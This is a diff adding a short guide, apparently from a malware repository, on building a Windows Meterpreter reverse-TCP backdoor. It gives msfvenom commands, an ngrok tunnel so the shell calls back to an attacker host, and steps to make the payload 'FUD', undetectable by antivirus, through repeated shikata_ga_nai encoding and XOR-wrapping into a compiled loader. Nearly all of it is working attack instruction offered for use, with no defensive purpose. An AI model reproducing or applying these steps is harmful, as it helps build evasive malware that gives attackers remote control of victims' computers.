@@ -1,0 +1,37 @@
+# Copyright (C) 2022
+# Frosts - https://t.me/Fr0sts
+
+How to build the payload ?
+root@os:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[YOUR IP] LPORT=[PORT OPENED] -f exe > shell.exe
+
+How to build a payload in raw for encrypting it ?
+root@os:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[YOUR IP] LPORT=[PORT OPENED] -f raw -o shell.txt
+
+==================================================================
+For exploiting Windows remote machine you can use NGrok as gateway
+==================================================================
+
+How to start NGrok ?
+You need to install NGrok on your device who will be the destination machine (the endpoint), when NGrok is installed do:
+┌ root@os:~# ngrok tcp 4444
+└ ┌ This command will return you a domain and a port. 
+  └ i.e: tcp://0.tcp.eu.ngrok.io:14922
+
+How to build a payload using NGrok gateway ?
+root@os:~# msfvenom -p windows/x64/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 10 LHOST=0.tcp.eu.ngrok.io LPORT=14922 -f raw -o shell.txt
+
+==================================================================
+               How to FUD your metasploit backdoor
+==================================================================
+
+The file `xor.py` is made for work on Python2 only (https://www.python.org/downloads/release/python-270/). For building the FUD payload start `xor.py` by typing `python2 xor.py shell.txt > shell.xor`
+After you need to change the `{payload}` in `exploit.cpp` with the `shell.xor` then save the `exploit.cpp` and use a PE Dev C++ for compiling it for Windows hosts.
+
+Note: `shikata_ga_nai` is a encoder/encrypter for your malware.
+      `-p` mean payload in Metasploit
+      `-i` mean the number of time that you want to encode the malware
+      `-e` mean encrypter in Metasploit
+      `LHOST` mean the host destination of the TCP socket
+      `LPORT` mean the port destination of the TCP socket
+      `-f` mean the type of export that you want
+      `-o` mean the output where you want to build the backdoor
